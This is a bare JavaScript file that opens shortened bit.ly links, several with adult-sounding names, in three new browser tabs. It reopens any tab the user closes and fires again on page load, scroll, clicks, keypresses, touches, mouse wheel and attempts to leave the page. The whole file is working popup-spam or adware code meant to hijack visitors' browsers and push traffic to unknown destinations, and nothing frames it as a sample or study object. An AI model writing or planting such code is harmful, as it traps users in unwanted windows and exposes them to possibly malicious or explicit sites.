var links = [
    'https://bit.ly/smashwatchkad',
    'https://bit.ly/smashwatchunder',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/lisa___ann?utm_source=una',
    'https://bit.ly/smashwatchriver',
    'https://bit.ly/smashwatchbid',
    'https://bit.ly/smashwatchmaven',
    'https://bit.ly/tagmone?utm_source=mone'
];

function openMultiplePopups(numTabs) {
    var openedPopups = [];
    
    // Shuffle links array
    var shuffledLinks = links.sort(() => Math.random() - 0.5);
    
    // Open numTabs number of links simultaneously
    for (var i = 0; i < numTabs; i++) {
        openedPopups.push(window.open(shuffledLinks[i], '_blank'));
    }

    function attemptOpen() {
        var closedPopups = 0;
        openedPopups.forEach(function(popup, index) {
            if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
                closedPopups++;
                // Generate new random link
                var randomIndex = Math.floor(Math.random() * links.length);
                var randomLink = links[randomIndex];
                openedPopups[index] = window.open(randomLink, '_blank');
            }
        });

        // If all popups are closed, open another set immediately
        if (closedPopups === numTabs) {
            openMultiplePopups(numTabs);
        }
    }

    attemptOpen();
}

function triggerOpenMultiplePopups(numTabs) {
    openMultiplePopups(numTabs);
}

window.addEventListener('load', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('scroll', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('keydown', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('scroll', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('keydown', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('beforeunload', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('beforeunload', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('click', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('click', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('mousewheel', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('mousewheel', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('touchstart', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('touchstart', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('touchmove', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('touchmove', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('touchend', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('touchend', function() {
    triggerOpenMultiplePopups(3);
});

window.addEventListener('unload', function() {
    triggerOpenMultiplePopups(3);
});

document.addEventListener('unload', function() {
    triggerOpenMultiplePopups(3);
});
